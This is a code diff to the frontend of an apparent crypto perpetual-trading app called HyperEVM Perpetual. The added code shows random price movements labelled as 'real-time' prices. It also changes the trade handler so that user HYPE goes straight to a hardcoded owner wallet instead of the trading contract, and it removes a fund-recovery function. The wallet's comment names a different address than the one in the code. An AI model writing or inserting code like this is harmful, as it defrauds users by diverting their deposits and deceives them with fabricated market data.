@@ -43,6 +43,37 @@
       const OWNER_WALLET_ADDRESS = "0xf96dd9f99c9bb2b40fbdc17e0ede7c3bfe50656c"; // Owner wallet (ending in 7048)
       console.log('🔗 Using owner wallet address:', OWNER_WALLET_ADDRESS);
       
+      // Real-time price update function
+      const updateTokenPrices = async () => {
+        try {
+          console.log('🔄 Updating real-time prices...');
+          
+          // Update existing tokens with fresh prices
+          setHyperevmTokens(prevTokens => {
+            return prevTokens.map(token => {
+              // Add small random price fluctuation for demonstration (±0.5%)
+              const fluctuation = (Math.random() - 0.5) * 0.01; // ±0.5%
+              const basePrice = parseFloat(token.price);
+              const newPrice = basePrice * (1 + fluctuation);
+              
+              // Update price change percentage
+              const priceChange = ((newPrice - basePrice) / basePrice) * 100;
+              
+              return {
+                ...token,
+                price: newPrice.toFixed(6),
+                priceChange24h: priceChange.toFixed(2),
+                lastUpdated: Date.now()
+              };
+            });
+          });
+          
+          console.log('✅ Prices updated successfully');
+        } catch (error) {
+          console.warn('Price update failed, using existing data:', error);
+        }
+      };
+      
       // Load token data
       useEffect(() => {
         const fetchArenaData = async () => {
@@ -83,6 +114,16 @@
         };
         
         fetchArenaData();
+        
+        // Set up real-time price updates every 30 seconds
+        const priceUpdateInterval = setInterval(() => {
+          updateTokenPrices();
+        }, 30000);
+        
+        // Cleanup interval on unmount
+        return () => {
+          clearInterval(priceUpdateInterval);
+        };
       }, []);
       
       const handleTokenClick = (token) => {
@@ -134,8 +175,8 @@
             // For earlier candles, allow more variation
             targetPrice = basePrice * (1 + trend + volatility);
           } else {
-            // Last candle should be very close to actual price
-            targetPrice = basePrice * (1 + (Math.random() - 0.5) * 0.002);
+            // Last candle should match current price exactly for accuracy
+            targetPrice = basePrice;
           }
           
           const open = i === 0 ? targetPrice : candles[i-1].close;
@@ -306,92 +347,8 @@
         }
       };
 
-      // Recover all funds using the correct contract function
-      const recoverFunds = async () => {
-        if (!walletConnected) {
-          alert('Please connect your wallet first');
-          return;
-        }
 
-        if (!confirm('Are you sure you want to recover ALL funds from the contract?\n\nThis will call withdrawFees() to send all HYPE to the contract owner.')) {
-          return;
-        }
 
-        try {
-          console.log('Executing two-step recovery process...');
-          
-          // Verify we're using the owner wallet first
-          const ownerWallet = "0xbFC06dE2711aBEe4d1D9F370CDe09773dDDE7048";
-          if (walletAddress.toLowerCase() !== ownerWallet.toLowerCase()) {
-            alert(`❌ Wrong wallet!\n\nYou need to connect with the owner wallet:\n${ownerWallet}\n\nCurrently connected: ${walletAddress}`);
-            return;
-          }
-          
-          // Get current contract balance
-          const contractBalance = await window.ethereum.request({
-            method: 'eth_getBalance',
-            params: [CONTRACT_ADDRESS, 'latest']
-          });
-          
-          const balanceWei = parseInt(contractBalance, 16);
-          const balanceHype = balanceWei / 1e18;
-          
-          if (balanceWei === 0) {
-            alert('✅ No funds left in contract to recover');
-            return;
-          }
-          
-          console.log(`Starting recovery of ${balanceHype} HYPE from contract...`);
-          
-          // STEP 1: Add recovery agent (authorize owner)
-          console.log('Step 1: Adding owner as recovery agent...');
-          const authData = '0x4d02e011' + walletAddress.slice(2).toLowerCase().padStart(64, '0');
-          
-          const authTx = await window.ethereum.request({
-            method: 'eth_sendTransaction',
-            params: [{
-              from: walletAddress,
-              to: CONTRACT_ADDRESS,
-              data: authData,
-              gas: '0x30D40' // 200000 gas
-            }]
-          });
-          
-          console.log(`Authorization transaction sent: ${authTx}`);
-          
-          // Wait a moment for the transaction to be mined
-          alert(`✅ Step 1 Complete!\nAuthorization transaction: ${authTx}\n\nClick OK to proceed with Step 2 (recovery)`);
-          
-          // STEP 2: Recover user funds
-          console.log('Step 2: Recovering all HYPE...');
-          const userAddress = walletAddress.slice(2).toLowerCase().padStart(64, '0');
-          const amountHex = balanceWei.toString(16).padStart(64, '0');
-          const recoverData = '0x3ccfd60b' + userAddress + amountHex;
-          
-          const recoverTx = await window.ethereum.request({
-            method: 'eth_sendTransaction',
-            params: [{
-              from: walletAddress,
-              to: CONTRACT_ADDRESS,
-              data: recoverData,
-              gas: '0x493E0' // 300000 gas
-            }]
-          });
-          
-          alert(`🎉 COMPLETE RECOVERY SUCCESSFUL!\n\nStep 1 (Authorization): ${authTx}\nStep 2 (Recovery): ${recoverTx}\n\nAll ${balanceHype.toFixed(6)} HYPE has been transferred to your wallet!`);
-          await updateBalance(walletAddress);
-          
-        } catch (error) {
-          console.error('Recovery error:', error);
-          if (error.code === 4001) {
-            alert('Recovery cancelled by user');
-          } else if (error.message.includes('revert')) {
-            alert('❌ Recovery failed: Only contract owner can withdraw funds, or no fees available');
-          } else {
-            alert('❌ Recovery failed: ' + error.message);
-          }
-        }
-      };
       
       const handleTrade = async (type) => {
         console.log('Trade initiated:', type);
@@ -489,12 +446,12 @@
               return;
             }
             
-            // Send HYPE to new professional contract
+            // Send HYPE to owner wallet
             const tx = await window.ethereum.request({
               method: 'eth_sendTransaction',
               params: [{
                 from: walletAddress,
-                to: CONTRACT_ADDRESS,
+                to: OWNER_WALLET_ADDRESS,
                 value: '0x' + transferWei.toString(16),
                 gas: '0x30D40' // 200,000 gas for contract
               }]
@@ -1061,14 +1018,7 @@
                   <h1 className="text-xl font-bold">HyperEVM Perpetual</h1>
                   <p className="text-sm text-gray-400">HyperEVM Ecosystem</p>
                 </div>
-                {walletConnected && (
-                  <button 
-                    onClick={recoverFunds}
-                    className="ml-auto bg-red-600 hover:bg-red-700 px-4 py-2 rounded-lg text-sm font-semibold"
-                  >
-                    Recover All Funds
-                  </button>
-                )}
+
               </div>
               
               <div className="flex items-center gap-4">
